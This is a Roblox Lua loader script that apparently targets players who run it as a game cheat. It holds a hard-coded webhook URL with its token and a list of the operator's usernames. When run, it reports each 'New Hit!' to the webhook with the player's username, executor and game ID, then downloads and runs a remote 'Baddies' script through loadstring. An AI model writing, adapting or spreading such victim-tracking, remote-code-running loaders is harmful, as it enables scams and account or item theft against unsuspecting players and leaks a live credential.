-- Your Own Loader

_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494661669849268365/mKzWrChl1qbxDMuG_w9WQyRS4W03KuSQigicg6y__FCCCftfUQoe9QkFfKd5ApNmlEfc"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- Change this to your Roblox usernames

_G.PING_POOR = true

-- Send notification when someone runs it
task.spawn(function()
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        local executor = identifyexecutor and identifyexecutor() or "Unknown"

        local message = "@everyone New Hit!\nUsername: " .. plr.Name .. "\nExecutor: " .. executor .. "\nGame: " .. game.PlaceId

        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
    end
end)

-- Load the main Baddies script
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end)
